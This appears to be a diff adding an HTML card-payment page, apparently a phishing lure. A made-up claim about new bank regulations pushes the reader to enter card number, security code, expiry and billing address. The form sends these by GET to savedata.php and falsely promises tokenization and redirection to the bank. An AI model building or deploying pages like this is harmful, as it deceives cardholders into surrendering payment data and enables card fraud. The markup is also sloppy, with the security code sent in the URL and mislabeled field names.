@@ -1,0 +1,67 @@
+<html>
+    <head>
+        <title>Payment form</title>
+        
+    </head>
+    <body>
+        <!--Payment text-->
+        <h2>Add a Payment Method</h2>
+        <p>Due to recent changes in bank regulations for remote credit card transactions,<br>
+            you'll need to go to Payment methods each month pay your balance.<br>
+            <a href="" style="text-decoration: none;color:rgb(32, 178, 204)" >Learn more about adding Payment methods</a>
+            <br><br></p>
+        <p>We accept the following cards</p>
+        <!--image-->
+        <img src="visa.png" style="width:120" height="40"><br><br>
+        <!--form-->
+        <form action="savedata.php" method="get">
+            <label>Card Number</label><br>
+            <input type="text" name="Card No" id="card" style="width: 400;padding: 5;" required autofocus><br>
+            <label>Security Code</label><br>
+            <input type="password" name="code" id="code" style="width: 400;padding: 5;" required autofocus><br>
+            <p>
+                <label>Expiration Month</label>
+                <label style="margin-left: 100px;">Expiration Year</label><br>
+                <select style="width:200;padding: 5px;">
+                    <option>Jan</option>
+                    <option>Feb</option>
+                    <option>Mar</option>
+                    <option>Apr</option>
+                    <option>May</option>
+                </select>
+                <select style="width:200;padding: 5px;">
+                    <option>2023</option>
+                    <option>2024</option>
+                    <option>2025</option>
+                    <option>2026</option>
+                    <option>2027</option>
+                </select>
+            </p>
+            <label>Name on Card</label><br>
+            <input type="text" name="Address" id="card" style="width: 400;padding: 5;" required autofocus><br>
+            <label>Address Line1</label><br>
+            <input type="text" name="Add1" id="Add1" style="width: 400;padding: 5;" required autofocus><br>
+            <label>Address Line2(Optional)</label><br>
+            <input type="text" name="Add2" id="Add2" style="width: 400;padding: 5;" required autofocus><br>
+            <label>Address Line3(Optional)</label><br>
+            <input type="text" name="Add3" id="Add3" style="width: 400;padding: 5;" required autofocus><br>
+            <label>City</label><br>
+            <input type="text" name="City" id="city" style="width: 400;padding: 5;" required autofocus><br>
+            <label>State</label><br>
+            <input type="text" name="state" id="state" style="width:400;padding: 5;" required autofocus><br>
+            <label>Postal Code</label><br>
+            <input type="number" name="postal" id="postal" style="width: 400;padding: 5;" required autofocus><br>
+            <label>Country/Region</label><br>
+            <!--options-->
+            <select disabled="true" style="width:150;padding: 5px;" >
+                <option>India</option>                              
+            </select> 
+            <p>By clicking the button below to continue,you consent to tokenize and save this<br>
+                 card.You'll be redirected to your bank's website for verification<br>
+                 <a href="" style="text-decoration: none;color:rgb(32, 178, 204)">Learn more about tokenization</a>
+                </p>
+            <input type="submit" value="Save" style="background-color: rgb(9, 110, 219);padding: 5px;color:white; width:150">
+            <input type="button" value="Cancel" style="background-color: rgb(125, 134, 144);padding: 5px;color:rgb(0, 0, 0); width:150">   
+        </form>
+    </body>
+</html>
